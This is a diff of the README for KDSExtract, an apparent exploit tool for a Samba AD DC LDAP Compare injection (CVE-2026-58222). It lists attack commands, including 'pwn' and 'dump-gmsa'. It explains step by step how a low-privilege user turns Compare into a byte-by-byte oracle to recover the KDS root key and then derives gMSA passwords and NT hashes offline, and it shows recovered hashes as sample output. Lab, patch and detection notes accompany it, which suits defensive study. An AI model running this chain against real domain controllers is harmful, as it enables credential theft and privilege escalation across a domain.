@@ -1,140 +1,290 @@
 # KDSExtract
 
-Full-chain exploit for **CVE-2026-58222** (Samba AD DC LDAP `Compare`
-filter injection + trusted-request confusion): an ordinary domain user
-recovers confidential attributes — notably the KDS root key — and
-derives gMSA passwords offline.
+Exploit for **CVE-2026-58222** affecting Samba AD DC LDAP `Compare`.
 
-```
-low-priv user ──LDAP Compare "attr>="──> ordered oracle ──> msKds-RootKeyData
-                                                                      │
-             MS-GKDI (SP 800-108, ported from Samba)                  ▼
-low-priv user <──────────── gMSA password + NT hash ─────── Golden gMSA chain
-```
+An authenticated low-privilege domain user can turn LDAP Compare into an ordered oracle for confidential attributes. KDSExtract uses it to recover `msKds-RootKeyData`, then derives gMSA passwords offline with MS-GKDI.
 
-Authorized-lab use only. The vulnerability is publicly documented
-(Samba advisory, patch, MS-GKDI spec); this project packages it.
+```text
+low-priv user
+      │
+      ▼
+LDAP Compare injection
+      │
+      ▼
+ordered comparison oracle
+      │
+      ▼
+msKds-RootKeyData
+      │
+      ▼
+MS-GKDI / SP 800-108
+      │
+      ▼
+gMSA password + NT hash
+```
 
 ## Install
 
+```bash
+pip install .
+pytest
 ```
-pip install .        # Python >= 3.9, no runtime dependencies
-pytest               # 45 tests, incl. Samba's own GKDI vectors
-```
+
+Requirements:
+
+- Python >= 3.9
+- No runtime dependencies
+- 45 tests, including Samba GKDI test vectors
 
 ## Usage
 
-```
-kdsextract check      --host dc --user lowpriv@lab.local
-kdsextract list-keys  --host dc --user lowpriv@lab.local
-kdsextract recover    --host dc --user lowpriv@lab.local --key <guid>
-kdsextract list-gmsa  --host dc --user lowpriv@lab.local
-kdsextract dump-gmsa --host dc --user lowpriv@lab.local --name 'svcgmsa$' --verify-bind
-kdsextract pwn       --host dc --user lowpriv@lab.local --verify-bind
+```bash
+kdsextract check \
+  --host dc \
+  --user lowpriv@lab.local
+
+kdsextract list-keys \
+  --host dc \
+  --user lowpriv@lab.local
+
+kdsextract recover \
+  --host dc \
+  --user lowpriv@lab.local \
+  --key <guid>
+
+kdsextract list-gmsa \
+  --host dc \
+  --user lowpriv@lab.local
+
+kdsextract dump-gmsa \
+  --host dc \
+  --user lowpriv@lab.local \
+  --name 'svcgmsa$' \
+  --verify-bind
+
+kdsextract pwn \
+  --host dc \
+  --user lowpriv@lab.local \
+  --verify-bind
 ```
 
-Password via `--password`, `KDSEXTRACT_PASSWORD`, or prompt. `--json`
-for machine-readable output. Plain LDAP first, auto-fallback to LDAPS
-(636) — Samba rejects plaintext simple binds and has no StartTLS.
+Password sources:
 
-`check`:
-
-```
-VULNERABLE (CVE-2026-58222): injected compare evaluates and confidential attributes participate
-NOT VULNERABLE: attribute operator injection rejected (invalidAttributeSyntax 21) -- fixed Samba
+```text
+--password
+KDSEXTRACT_PASSWORD
+interactive prompt
 ```
 
-`pwn` (from the lab, trimmed):
+Use `--json` for machine-readable output.
 
+The client tries LDAP first and falls back to LDAPS on port 636 when required.
+
+## Example
+
+`check` against a vulnerable DC:
+
+```text
+VULNERABLE (CVE-2026-58222)
+injected compare evaluates and confidential attributes participate
 ```
+
+Against a patched DC:
+
+```text
+NOT VULNERABLE
+attribute operator injection rejected
+LDAP result: invalidAttributeSyntax (21)
+```
+
+Full chain:
+
+```text
 verdict: VULNERABLE
 
 root keys:
-  effd1d54-... (gmsa-reference): 802da1146c207a75...  (576 queries)
+  effd1d54-... (gmsa-reference)
+  802da1146c207a75...
+  queries: 576
 
-gMSA svcgmsa$  (sid S-1-5-21-...)
-  root key effd1d54-... hash=SHA512 gkid=364,15,14
-  password (utf-16 hex): 73764bf424123f6b...
-  NT hash: cf30eb5212fe22e696bea95f02010e05
+gMSA svcgmsa$
+  sid: S-1-5-21-...
+  root key: effd1d54-...
+  hash: SHA512
+  gkid: 364,15,14
+
+  password (utf-16 hex):
+    73764bf424123f6b...
+
+  NT hash:
+    cf30eb5212fe22e696bea95f02010e05
 ```
 
 ## How it works
 
-Samba's vulnerable `Compare` path built its internal filter with
-`talloc_asprintf("(%s=%*s)", attribute, len, data)`: no attribute-name
-validation, no value escaping. A trailing `>` turns the comparison into
-`>=`, and the internal search ran without `DSDB_MARK_REQ_UNTRUSTED`, so
-confidential attributes participate despite being redacted from Search.
+The vulnerable Samba LDAP Compare path built an internal filter similar to:
 
-Each `Compare` answers "stored >= candidate?" (`ldb_comparison_binary`
-order: memcmp, shorter-is-less), so a per-byte binary search recovers
-the whole value. Every candidate byte is sent `\XX`-escaped — the
-embedded string stays printable, so `printf("%*s")` cannot truncate at
-NUL — and `ldb_parse_tree` unescapes it server-side. Cost: 8-9
-compares per byte, ~576 for the 64-byte root key.
-
-With the root key, the gMSA password falls offline: SP 800-108
-counter-mode HMAC (hash from `msKds-KDFParam`), the
-`GkdiDerivationCtx` serialization, the L0 → L1 → L2 seed-key walk
-(labels `"KDS service"` / `"GMSA PASSWORD"` in UTF-16LE), and the
-256-byte password with NUL post-processing. The port is byte-exact
-with Samba — its 12 test vectors are in the test suite. When
-`msKds-KDFParam` is hidden (Samba hides root key attributes from
-ordinary users), both platform defaults are derived: SHA512
-(Samba-created keys, confirmed correct live) then SHA256 (Windows).
-
-## The lab
-
+```c
+talloc_asprintf("(%s=%*s)", attribute, len, data)
 ```
+
+The attribute name was not validated and the assertion value was not safely encoded.
+
+Appending `>` to the attribute changes the internal comparison from equality to `>=`.
+
+The internal lookup also ran without `DSDB_MARK_REQ_UNTRUSTED`. Confidential attributes could therefore affect the result even though normal LDAP Search hides them.
+
+The resulting primitive is:
+
+```text
+stored_value >= candidate ?
+```
+
+Samba compares binary values using `memcmp`, with shorter values ordered before longer ones.
+
+KDSExtract performs a binary search for every byte. Candidate bytes are encoded as `\XX`, keeping the constructed filter printable while Samba decodes them back to binary during parsing.
+
+A 64-byte KDS root key takes about 576 Compare requests.
+
+## gMSA derivation
+
+Once `msKds-RootKeyData` is recovered, no more oracle requests are needed.
+
+KDSExtract implements:
+
+- SP 800-108 counter-mode HMAC
+- `GkdiDerivationCtx`
+- L0 → L1 → L2 seed-key derivation
+- `"KDS service"` derivation
+- `"GMSA PASSWORD"` derivation
+- 256-byte managed-password generation
+- gMSA NUL post-processing
+- NT hash calculation
+
+The implementation is byte-compatible with Samba's GKDI logic and is tested against Samba's test vectors.
+
+If `msKds-KDFParam` is not readable, KDSExtract derives both common variants:
+
+```text
+SHA512
+SHA256
+```
+
+Samba-created root keys use SHA512 in the tested lab.
+
+## Root-key discovery
+
+Samba hides `msKds-ProvRootKey` objects from ordinary users.
+
+KDSExtract therefore does not depend on listing the root-key container.
+
+It follows:
+
+```text
+gMSA
+  ↓
+msDS-ManagedPasswordID
+  ↓
+root-key GUID
+  ↓
+root-key DN
+```
+
+The Compare oracle itself does not require normal Search access to the secret attribute.
+
+## Lab
+
+```bash
 cd lab
 ./run-demo.sh
 ```
 
-Builds Samba **4.24.4** (vulnerable) and **4.24.5** (fixed) from
-upstream git tags, provisions identical domains (`lab.local`, KDS root
-key backdated one 10h key cycle, gMSA `svcgmsa$`, user `lowpriv`), then
-asserts end to end:
+The lab builds:
 
-| check | dc-vuln (4.24.4) | dc-fixed (4.24.5) |
-|---|---|---|
-| injected `>=` compare | evaluates (oracle live) | rejected, code 21 |
-| `msKds-RootKeyData` | recovered, byte-exact vs DC ground truth | n/a |
-| derived gMSA password | NT hash == DC's stored `unicodePwd` | n/a |
+```text
+Samba 4.24.4    vulnerable
+Samba 4.24.5    patched
+```
 
-Root-key ground truth comes from `samba-tool domain kds root-key list
---show-secrets`, password ground truth from `samba-tool user getpassword`
-(Samba computes the managed password on the fly). The demo exits 0
-only if every assertion holds. `docker compose down -v` for a fresh
-provision.
+Both DCs use equivalent `lab.local` environments containing:
 
-Note: Samba search-hides `msKds-ProvRootKey` objects from ordinary
-users, so discovery flows gMSA → `msDS-ManagedPasswordID` → root key
-DN (GoldenGMSA's flow) — the Compare oracle needs no search rights.
+- a KDS root key
+- gMSA `svcgmsa$`
+- user `lowpriv`
+
+The vulnerable DC is tested end to end.
+
+| Test | 4.24.4 | 4.24.5 |
+| --- | --- | --- |
+| injected `>=` Compare | accepted | rejected with code 21 |
+| `msKds-RootKeyData` recovery | byte-exact | n/a |
+| derived gMSA password | matches DC | n/a |
+
+Ground truth:
+
+```text
+KDS root key:
+samba-tool domain kds root-key list --show-secrets
+
+gMSA password:
+samba-tool user getpassword
+```
+
+The demo exits successfully only when all assertions pass.
+
+Reset the lab with:
+
+```bash
+docker compose down -v
+```
 
 ## Limitations
 
-* TLS peer verification skipped (lab DC certs are self-signed).
-* gMSA passwords are 128 UTF-16 chars; a small fraction contain unpaired
-  surrogates that can't round-trip a simple-bind *string* — the tool
-  reports this; the bytes and NT hash are still exact (the lab proves
-  it against the DC).
-* Kerberos AS-REQ (NT-hash-keyed RC4) verification would avoid the
-  string issue entirely — future work.
+- TLS certificate verification is disabled for the self-signed lab DC certificates.
+- gMSA passwords are 128 UTF-16 characters. Some contain unpaired surrogates and cannot be represented cleanly as a simple-bind string.
+- In that case the recovered bytes and NT hash remain valid.
+- Kerberos verification using the derived key is not implemented yet.
 
-## Fix / detection
+## Fix
 
-Fixed in Samba **4.24.5 / 4.23.10 / 4.22.11** (2026-07-28). The patch
-validates the attribute name (`ldb_valid_attr_name`), binary-encodes
-the value (`ldb_binary_encode`), and marks the internal search
-untrusted. Detection: bursts of Compares from one connection, attribute
-descriptions ending in `>`, targeting `CN=Master Root Keys` objects;
-code-21 responses identify patched DCs.
+Fixed in:
+
+```text
+Samba 4.24.5
+Samba 4.23.10
+Samba 4.22.11
+```
+
+Released on 2026-07-28.
+
+The patch:
+
+- validates LDAP attribute names with `ldb_valid_attr_name`
+- encodes assertion values with `ldb_binary_encode`
+- marks the internal lookup with `DSDB_MARK_REQ_UNTRUSTED`
+
+## Detection
+
+Useful indicators include:
+
+- bursts of LDAP Compare requests from one connection
+- attribute descriptions ending in `>`
+- Compare requests against `CN=Master Root Keys`
+- repeated comparisons against confidential binary attributes
+- LDAP result code 21 from patched DCs
 
 ## Credits
 
-CVE-2026-58222 reported by OpenAI Security Research (Samba bug 16148);
-patches by Stefan Metzmacher / SerNet. GKDI derivation ported from
-Samba (GPL-3.0) and cross-checked against
-[GoldenGMSA](https://github.com/Semperis/GoldenGMSA) (MIT). Advisory:
-<https://www.samba.org/samba/security/CVE-2026-58222.html>. This
-project's code: MIT.
+CVE-2026-58222 was reported by OpenAI Security Research as Samba bug 16148.
+
+Samba patches were written by Stefan Metzmacher / SerNet.
+
+The GKDI implementation was ported from Samba and cross-checked against GoldenGMSA:
+
+https://github.com/Semperis/GoldenGMSA
+
+Samba advisory:
+
+https://www.samba.org/samba/security/CVE-2026-58222.html
+
+Project license: MIT.
